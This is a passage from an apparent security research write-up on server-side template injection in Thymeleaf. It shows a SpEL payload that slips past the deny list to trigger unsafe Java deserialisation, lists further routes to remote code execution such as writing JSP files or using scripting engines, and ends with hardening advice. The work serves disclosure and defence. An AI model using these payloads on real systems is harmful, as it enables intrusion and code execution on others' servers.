* trigger an unsafe deserialisation. For instance, the class `org.springframework.core.serializer.DefaultDeserializer` does not belong to the deny list, and could be invoked in this way:

```shell
${
    new org.springframework.core.serializer.DefaultDeserializer().deserialize(
        new org.springframework.core.io.ByteArrayResource(
            T(org.yaml.snakeyaml.external.biz.base64Coder.Base64Coder).decode('rO0ABXNyA...')
        ).getInputStream()
    )
}
```
* if JSP files can be interpreted, try to write one somewhere. There are numerous ways, depending on the available libraries. Here are two examples:
    * `ch.qos.logback.core.util.FileUtil->copy(String src, String destination)` to copy a file to another place (e.g. an uploaded one to a location where JSP are stored)
    * `org.apache.commons.io.FileUtils->writeXXXX` functions
* Additionally, there are multiple ways to read files stored on the local disk, containing juicy information 
* if the application communicates with a database, and if the DBMS allows it, maybe try to execute command within an SQL query
* the package `org.springframework.scripting.*` is allowed. If engines are available, they might be a convenient way to get RCE

## Recommendations

Of course, should an SSTI occur, it would be because of an improper user input handling, and a misuse of Thymeleaf. To better protect Spring applications, it is paramount to filter input and escape output. Information submitted by users should not be blindly reflected, **especially in dangerous contexts**.

On Thymeleaf's side, it would be worth considering the facts that `MethodInvokingRunnable`  should belong to the denylist, and `#ctx` less powerful. Still, a denylist approach would always be less effective that an allowlist. Denying all potentially dangerous third-party libraries of the world would be vain, for sure. Although one could consider that it is entirely up to the developers to properly use Thymeleaf, I already saw applications were adding new templates was a legitimate feature. It sounds like an SSTI-as-a-service, and therefore, if done on purpose, the sandboxing process is important and should be as strong as possible.
